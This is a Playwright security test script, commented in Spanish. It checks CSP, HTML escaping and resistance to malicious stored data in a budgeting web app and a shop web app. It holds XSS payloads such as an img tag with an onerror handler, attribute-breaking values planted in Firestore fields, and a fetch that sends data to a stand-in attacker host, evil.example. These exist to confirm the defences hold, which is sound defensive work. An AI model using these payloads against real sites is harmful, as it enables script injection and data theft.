// Seguridad: política de contenido (CSP), escape de datos y documentos con nombres raros.
// Uso (desde una carpeta con pub/ y mockfb.js): node tseg.js
const {chromium}=require(process.env.PW||'playwright');const {spawn}=require('child_process');const fs=require('fs');
(async()=>{
const srv=spawn('python3',['-m','http.server','8861'],{cwd:process.cwd()+'/pub',stdio:'ignore'});await new Promise(r=>setTimeout(r,800));
const b=await chromium.launch();let ok=0,bad=0;const CK=(n,c,i)=>{c?ok++:bad++;console.log(c?'  ✔':'  ✘',n,i===undefined?'':i)};
const MAL='<img src=x onerror="window.__xss=1">\'"';
async function nueva(){
  const ctx=await b.newContext({viewport:{width:390,height:844},locale:'es-CO',serviceWorkers:'block'});
  await ctx.route(/fonts\.g/,r=>r.abort());
  await ctx.route(/firebase-app-compat/,r=>r.fulfill({body:fs.readFileSync('mockfb.js','utf8'),contentType:'application/javascript'}));
  await ctx.route(/firebase-(auth|firestore|messaging)-compat/,r=>r.fulfill({body:'',contentType:'application/javascript'}));
  await ctx.route(/evil\.example/,r=>r.fulfill({body:'window.__evil=1',contentType:'application/javascript'}));
  const p=await ctx.newPage();p.errs=[];p.csp=[];
  p.on('pageerror',e=>p.errs.push(e.message));
  p.on('console',m=>{const t=m.text();if(/Content Security Policy|Refused to/i.test(t))p.csp.push(t.slice(0,200))});
  p.on('dialog',d=>d.accept());
  await p.addInitScript(()=>{try{if(!localStorage.getItem('luks-lang'))localStorage.setItem('luks-lang','es')}catch(e){}window.__cspv=[];document.addEventListener('securitypolicyviolation',e=>window.__cspv.push(e.violatedDirective+' '+e.blockedURI))});
  return p;
}
const W=(p,ms)=>p.waitForTimeout(ms||400);
const limpio=p=>p.evaluate(()=>({xss:window.__xss||0,img:document.querySelectorAll('img[src="x"]').length,on:document.querySelectorAll('[onerror],[onclick],[onmouseover],[onload]').length}));

console.log('1. Lu-Ks: la política de seguridad está puesta y no estorba');
let p=await nueva();await p.goto('http://localhost:8861/');await W(p,2500);
CK('la página trae la política (CSP)',await p.evaluate(()=>!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')));
await p.click('#nv-bv [data-bv="up"]').catch(()=>p.click('[data-au="up"]'));await W(p,900);await p.fill('#au-n','Ana');await p.fill('#au-e','ana@x.com');await p.fill('#au-p','secreto1');await p.click('#au-go');await W(p,2500);
for(let i=0;i<8;i++){await p.evaluate(()=>{const s=document.querySelector('[data-ob="skip"]');if(s)s.click()});await W(p,250)}
CK('entra a la app',await p.evaluate(()=>!!window.LKREADY));
CK('esc() también cambia la comilla simple',await p.evaluate(()=>esc("a'b\"<c>&")==="a&#39;b&quot;&lt;c&gt;&amp;"),await p.evaluate(()=>esc("a'b")));
console.log('2. Lu-Ks: datos con código escondido no se ejecutan');
await p.evaluate(M=>{var rows=Object.keys(CATS).filter(k=>k!=='ing').map(k=>[k,CATS[k][0],CATS[k][1],CATS[k][2],'']);rows.push(['zz',M,M,'red" onmouseover="window.__xss=1','']);rows.push(['',M,'','','zz']);applyCats(rows);BUD.zz=5000;var d=new Date().toISOString().slice(0,10);tx.push({id:99991,date:d,amt:1200,mer:M,acc:M,cat:'zz',sub:M,tipo:'out',raw:{}});},MAL);
CK('el color raro de la categoría se cambia por uno normal',await p.evaluate(()=>CATS.zz&&CATS.zz[2]==='#8A94A6'),await p.evaluate(()=>CATS.zz&&CATS.zz[2]));
const visto={xss:0,img:0,on:0};
for(const c of [['home','','',''],['home','','aho',''],['home','','fin',''],['tx','','',''],['rep','','','rep'],['rep','','','exp'],['con','','',''],['con','cats','',''],['con','manage','',''],['home','','','']]){await p.evaluate(c=>{try{tab=c[0];SUB=c[1];if(c[2])HV=c[2];if(c[3])RT=c[3];render()}catch(e){window.__rerr=(window.__rerr||'')+c.join('/')+':'+e.message+' '}},c);await W(p,350);const q=await limpio(p);visto.xss+=q.xss;visto.img+=q.img;visto.on+=q.on}
await p.evaluate(()=>{try{openBud('zz')}catch(e){}});await W(p,300);await p.evaluate(()=>{var s=document.getElementById('bsheet');if(s)s.classList.remove('on')});
let r=visto;CK('recorrer todas las pantallas con una categoría y un movimiento maliciosos: nada se ejecuta',r.xss===0&&r.img===0&&r.on===0,JSON.stringify(r));
CK('las pestañas se dibujan sin errores',!(await p.evaluate(()=>window.__rerr)),await p.evaluate(()=>window.__rerr));
CK('el nombre malicioso se ve como texto',await p.evaluate(()=>{tab='tx';render();return document.body.innerText.indexOf('<img src=x')>=0}));
console.log('3. Lu-Ks: sin código en línea en los botones');
await p.evaluate(()=>{if(window.LKINST){var d=document.createElement('div');d.innerHTML='<button id="tinst" data-lkinst="1">x</button>';document.body.appendChild(d);document.getElementById('tinst').click()}});await W(p,500);
CK('el botón "Instalar" funciona sin onclick',await p.evaluate(()=>!!document.querySelector('.lk-im')));
r=await limpio(p);CK('no queda ningún onclick/onerror en la página',r.on===0,r.on);
console.log('4. Lu-Ks: el navegador bloquea código de otros sitios');
CK('ningún bloqueo durante el uso normal',(await p.evaluate(()=>window.__cspv)).length===0&&p.csp.length===0,JSON.stringify(await p.evaluate(()=>window.__cspv))+p.csp.join('|'));
await p.evaluate(()=>{var s=document.createElement('script');s.src='https://evil.example/x.js';document.head.appendChild(s)});await W(p,800);
CK('un script de un sitio desconocido NO se carga',await p.evaluate(()=>!window.__evil&&window.__cspv.some(x=>/script-src/.test(x))),JSON.stringify(await p.evaluate(()=>window.__cspv)));
await p.evaluate(()=>fetch('https://evil.example/robo?d=1').catch(()=>{}));await W(p,500);
CK('la página no puede enviar datos a un sitio desconocido',await p.evaluate(()=>window.__cspv.some(x=>/connect-src/.test(x))));
CK('sin errores en la web',p.errs.length===0,p.errs.join(' | ').slice(0,300));
await p.context().close();

console.log('5. Tienda: política puesta y uso normal');
p=await nueva();await p.goto('http://localhost:8861/tienda/');await W(p,1500);
CK('la página trae la política (CSP)',await p.evaluate(()=>!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')));
await p.click('[data-am="up"]');await p.fill('#au-e','t@x.com');await p.fill('#au-p','secreto1');await p.click('#au-go');await W(p,1500);
await p.evaluate(()=>{const u=firebase.auth().currentUser.uid;const b=firebase.firestore().batch();b.set({path:'licencias/'+u},{});return b.commit()});await W(p,1200);
await p.click('[data-tab="inv"]');await p.click('[data-a="nuevoProd"]');await p.fill('#p-n','Arroz Diana 500 g');await p.fill('#p-pv','3200');await p.fill('#p-pc','2600');await p.fill('#p-st','20');await p.click('[data-a="guardarProd"]');await W(p,400);
CK('se guarda un producto normal',await p.evaluate(()=>document.body.innerText.indexOf('Arroz Diana')>=0));
console.log('6. Tienda: documentos y datos maliciosos (como los que podría colar un empleado)');
await p.evaluate(M=>{const u=firebase.auth().currentUser.uid,db=firebase.firestore(),b=db.batch();
  b.set({path:'users/'+u+'/t_prod/'+'x"><img src=x onerror=window.__xss=1>'},{n:'Trampa',pv:1000,st:1});
  const hoy=new Date().toISOString().slice(0,10);
  b.set({path:'users/'+u+'/t_prod/bueno2'},{n:M,pv:1500,pc:1000,st:3,u:M,cod:M,cat:M,min:M,pks:[{n:M,q:M,pv:M}],lotes:[{f:M,q:M}]});
  b.set({path:'users/'+u+'/t_cli/c1'},{n:M,tel:M,nota:M});
  b.set({path:'users/'+u+'/t_prov/p1'},{n:M,tel:M,nota:M});
  b.set({path:'users/'+u+'/t_fmov/f1'},{cli:'c1',tipo:'cargo',m:5000,nota:M,fecha:hoy,ts:Date.now(),metodo:M,por:M});
  b.set({path:'users/'+u+'/t_gasto/g1'},{m:5000,nota:M,cat:M,fecha:hoy,ts:Date.now(),metodo:M,por:M});
  b.set({path:'users/'+u+'/t_venta/v1'},{total:5000,items:[{id:'bueno2',n:M,q:1,pv:5000,u:M}],fecha:hoy,ts:Date.now(),metodo:M,por:M,cliN:M,nota:M});
  b.set({path:'users/'+u+'/t_conf/main'},{tienda:M,margen:M,diasCobro:M,diasVence:M,qr:'x" onerror="window.__xss=1',nequi:M,wa:M});
  return b.commit()},MAL);await W(p,900);
await p.evaluate(()=>{const b=document.querySelector('[data-tab="inv"]');if(b)b.click()});await W(p,500);
CK('el documento con nombre raro se ignora (y los demás siguen)',await p.evaluate(()=>{var t=document.body.innerText;return t.indexOf('Trampa')<0&&t.indexOf('Arroz Diana')>=0&&t.indexOf('‹img src=x')>=0}),await p.evaluate(()=>document.body.innerText.replace(/\n+/g,' | ').slice(0,260)));
const vt={xss:0,img:0,on:0};const suma=async()=>{const q=await limpio(p);vt.xss+=q.xss;vt.img+=q.img;vt.on+=q.on};
for(const t of ['caja','fiados','inv','gastos','rep','caja']){await p.evaluate(t=>{const b=document.querySelector('[data-tab="'+t+'"]');if(b)b.click()},t);await W(p,400);await suma()}
for(const a of ['ajustes','verVenta','verGasto','gasto','cierre']){await p.evaluate(a=>{const b=document.querySelector('[data-a="'+a+'"]');if(b)b.click()},a);await W(p,500);await suma();await p.evaluate(()=>{const x=document.querySelector('[data-a="cerrar"]');if(x)x.click()});await W(p,250)}
r=vt;CK('recorrer la tienda, Ajustes, una venta y un gasto: nada se ejecuta',r.xss===0&&r.img===0&&r.on===0,JSON.stringify(r));
await p.evaluate(()=>{const b=document.querySelector('[data-a="close"],#sh-x,.sheet .x');if(b)b.click()});
await p.evaluate(()=>{const b=document.querySelector('[data-tab="caja"]');if(b)b.click()});await W(p,300);
await p.evaluate(()=>{const b=document.querySelector('[data-a="venta"]');if(b)b.click()});await W(p,600);
r=await limpio(p);CK('abrir una venta con el producto malicioso: nada se ejecuta',r.xss===0&&r.img===0&&r.on===0,JSON.stringify(r));
CK('ningún bloqueo durante el uso normal',(await p.evaluate(()=>window.__cspv)).length===0&&p.csp.length===0,JSON.stringify(await p.evaluate(()=>window.__cspv))+p.csp.join('|'));
await p.evaluate(()=>{var s=document.createElement('script');s.src='https://evil.example/x.js';document.head.appendChild(s)});await W(p,800);
CK('un script de un sitio desconocido NO se carga',await p.evaluate(()=>!window.__evil&&window.__cspv.some(x=>/script-src/.test(x))));
CK('sin errores en la web',p.errs.length===0,p.errs.join(' | ').slice(0,300));
await p.context().close();

console.log('7. Páginas sueltas');
for(const u of ['tienda/conoce.html','privacidad.html']){p=await nueva();await p.goto('http://localhost:8861/'+u);await W(p,1200);
  CK(u+': con política y sin bloqueos',await p.evaluate(()=>!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')&&window.__cspv.length===0)&&p.errs.length===0,JSON.stringify(await p.evaluate(()=>window.__cspv))+p.errs.join('|'));await p.context().close()}
console.log('\n'+ok+' bien, '+bad+' mal');await b.close();srv.kill();process.exit(bad?1:0)})().catch(e=>{console.error(e);process.exit(1)});
